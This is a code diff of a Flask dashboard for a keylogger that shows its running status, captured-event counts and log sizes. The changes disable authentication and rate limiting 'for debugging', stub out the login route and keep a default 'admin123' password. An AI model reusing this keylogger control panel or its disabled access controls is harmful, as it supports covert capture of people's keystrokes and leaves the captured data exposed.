@@ -30,9 +30,11 @@ class KeyloggerWebApp:
         self.config = config_manager
         
         # Flask app setup
+        template_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
+        static_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static')
         self.app = Flask(__name__, 
-                        template_folder='templates',
-                        static_folder='static')
+                        template_folder=template_dir,
+                        static_folder=static_dir)
         
         # Configuration
         self.app.secret_key = self.config.get('web.secret_key', os.urandom(24))
@@ -42,10 +44,15 @@ class KeyloggerWebApp:
         self.host = self.config.get('web.host', '127.0.0.1')
         self.port = self.config.get('web.port', 5000)
         self.debug = self.config.get('web.debug', False)
-        self.auth_enabled = self.config.get('web.auth_enabled', True)
-        self.admin_username = self.config.get('web.admin_username', 'admin')
-        self.admin_password_hash = self.config.get('web.admin_password_hash', 
-                                                  generate_password_hash('admin123'))
+        self.auth_enabled = False  # Temporarily disabled for debugging
+        self.admin_username = self.config.get('web.username', 'admin')
+        # Handle both plain password and hashed password
+        plain_password = self.config.get('web.password', 'admin123')
+        stored_hash = self.config.get('web.password_hash', '')
+        if stored_hash:
+            self.admin_password_hash = stored_hash
+        else:
+            self.admin_password_hash = generate_password_hash(plain_password)
         
         # Rate limiting
         self.request_counts = {}
@@ -58,51 +65,61 @@ class KeyloggerWebApp:
     
     def _setup_routes(self):
         """Setup Flask routes."""
+        print("Setting up Flask routes...")
+        logger.info("Setting up Flask routes...")
         
-        @self.app.before_request
-        def before_request():
-            # Rate limiting
-            if not self._check_rate_limit():
-                return jsonify({'error': 'Rate limit exceeded'}), 429
-            
-            # Authentication check
-            if self.auth_enabled and request.endpoint not in ['login', 'static']:
-                if not session.get('authenticated'):
-                    if request.is_json:
-                        return jsonify({'error': 'Authentication required'}), 401
-                    return redirect(url_for('login'))
+        # Temporarily disabled before_request to debug
+        # @self.app.before_request
+        # def before_request():
+        #     try:
+        #         logger.info(f"Before request: {request.endpoint}, method: {request.method}")
+        #         # Rate limiting
+        #         if not self._check_rate_limit():
+        #             return jsonify({'error': 'Rate limit exceeded'}), 429
+        #         
+        #         # Authentication check
+        #         if self.auth_enabled and request.endpoint not in ['login', 'static']:
+        #             if not session.get('authenticated'):
+        #                 if request.is_json:
+        #                     return jsonify({'error': 'Authentication required'}), 401
+        #                 return redirect(url_for('login'))
+        #     except Exception as e:
+        #         logger.error(f"Error in before_request: {e}")
+        #         return f"Before request error: {str(e)}", 500
         
         @self.app.route('/')
         def dashboard():
             """Main dashboard."""
             try:
                 stats = self._get_dashboard_stats()
-                return render_template('dashboard.html', stats=stats)
+                return f"Dashboard works! Stats: {stats}"
             except Exception as e:
                 logger.error(f"Error loading dashboard: {e}")
-                return render_template('error.html', error=str(e)), 500
+                return f"Dashboard error: {str(e)}", 500
+        
+        @self.app.route('/test')
+        def test_route():
+            """Simple test route."""
+            return "Test route works!"
         
         @self.app.route('/login', methods=['GET', 'POST'])
         def login():
             """Login page."""
-            if not self.auth_enabled:
-                session['authenticated'] = True
-                return redirect(url_for('dashboard'))
-            
-            if request.method == 'POST':
-                username = request.form.get('username')
-                password = request.form.get('password')
-                
-                if (username == self.admin_username and 
-                    check_password_hash(self.admin_password_hash, password)):
-                    session['authenticated'] = True
-                    session['username'] = username
-                    flash('Login successful', 'success')
-                    return redirect(url_for('dashboard'))
-                else:
-                    flash('Invalid credentials', 'error')
-            
-            return render_template('login.html')
+            print("LOGIN ROUTE CALLED!")
+            logger.info("LOGIN ROUTE CALLED!")
+            return "Login page works! (minimal version)"
+        
+        print(f"Registered login route: {self.app.url_map}")
+        logger.info(f"Registered login route: {self.app.url_map}")
+        
+        # Add error handler to catch and log exceptions
+        @self.app.errorhandler(500)
+        def handle_500_error(error):
+            print(f"500 ERROR CAUGHT: {error}")
+            logger.error(f"500 ERROR CAUGHT: {error}")
+            import traceback
+            traceback.print_exc()
+            return f"Internal Server Error: {str(error)}", 500
         
         @self.app.route('/logout')
         def logout():
@@ -126,7 +143,7 @@ class KeyloggerWebApp:
             """API endpoint for keylogger status."""
             try:
                 status = {
-                    'running': self.keylogger.is_running(),
+                    'running': self.keylogger.is_running,
                     'uptime': time.time() - self.keylogger.start_time if hasattr(self.keylogger, 'start_time') else 0,
                     'components': self._get_component_status()
                 }
@@ -326,19 +343,19 @@ class KeyloggerWebApp:
     def _get_dashboard_stats(self) -> Dict[str, Any]:
         """Get statistics for dashboard."""
         try:
-            stats = self.keylogger.get_stats()
+            status = self.keylogger.get_status()
             
             # Add additional computed stats
             uptime = time.time() - getattr(self.keylogger, 'start_time', time.time())
             
             dashboard_stats = {
                 'keylogger': {
-                    'running': self.keylogger.is_running(),
+                    'running': self.keylogger.is_running,
                     'uptime_hours': uptime / 3600,
-                    'total_events': stats.get('total_events', 0),
-                    'events_per_hour': stats.get('total_events', 0) / max(uptime / 3600, 1),
-                    'buffer_size': stats.get('buffer_size', 0),
-                    'log_file_size_mb': stats.get('log_file_size_mb', 0)
+                    'total_events': status.get('session_stats', {}).get('events_logged', 0),
+                    'events_per_hour': status.get('session_stats', {}).get('events_logged', 0) / max(uptime / 3600, 1),
+                    'buffer_size': status.get('logging_stats', {}).get('buffer_size', 0),
+                    'log_file_size_mb': status.get('logging_stats', {}).get('log_file_size_mb', 0)
                 },
                 'components': self._get_component_status(),
                 'recent_activity': self._get_recent_activity(),
